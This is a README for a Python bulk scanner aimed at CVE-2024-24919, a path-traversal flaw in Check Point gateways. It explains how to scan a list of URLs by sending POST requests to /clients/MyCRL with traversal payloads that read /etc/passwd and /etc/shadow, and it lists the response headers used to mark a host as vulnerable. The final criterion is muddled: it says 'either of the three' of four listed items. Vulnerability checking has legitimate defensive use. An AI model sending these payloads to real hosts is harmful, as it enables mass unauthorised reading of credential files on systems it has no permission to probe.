## Features

- Sends POST requests with payloads to specified URLs.
- Checks the response headers and status line to determine vulnerabilities.
- Logs full request and response details.
- Outputs progress and results in the terminal.
- Saves vulnerable URLs to a file.
- Supports sequential scanning to ensure reliable request handling.

## Requirements

- Python 3.x
- `requests` library
- `termcolor` library

## Installation

1. **Clone the repository:**

    ```bash
    git clone https://github.com/ifconfig-me/CVE-2024-24919-Bulk-Scanner.git
    cd CVE-2024-24919-Bulk-Scanner
    ```

2. **Install the required libraries:**

    ```bash
    pip install requests termcolor
    ```

## Usage

1. **Prepare a file with the list of URLs:**

    Create a text file (e.g., `urls.txt`) with one URL per line. Make sure each URL starts with `https://`. Example:

    ```
    example.com
    testsite.com
    vulnerable.com
    123.456.789.10:8080
    ```

2. **Run the script:**

    ```bash
    python CVE-2024-24919-auto.py -f urls.txt
    ```

3. **Check the output:**

    The script will print the scanning progress and results in the terminal. Vulnerable URLs will be identified with the message `Vulnerable URL found:`.

4. **Results:**

    - **Progress and results** will be displayed in the terminal.
    - **Request and response logs** will be saved in `request-analyze.txt`.
    - **Vulnerable URLs** will be saved in `checkpoint-results.txt`.

## Script Details

- The script sends POST requests to the `/clients/MyCRL` endpoint of each URL with two payloads:
  - `aCSHELL/../../../../../../../etc/passwd`
  - `aCSHELL/../../../../../../../etc/shadow`

- It checks the response headers for the following criteria:
  - `Server: Check Point SVN foundation`
  - `X-UA-Compatible: IE=EmulateIE7`
  - `X-Frame-Options: SAMEORIGIN`
  - Status line: `HTTP/1.0 200 OK`

- If the response matches either of the three of the above criteria, the URL is considered vulnerable.
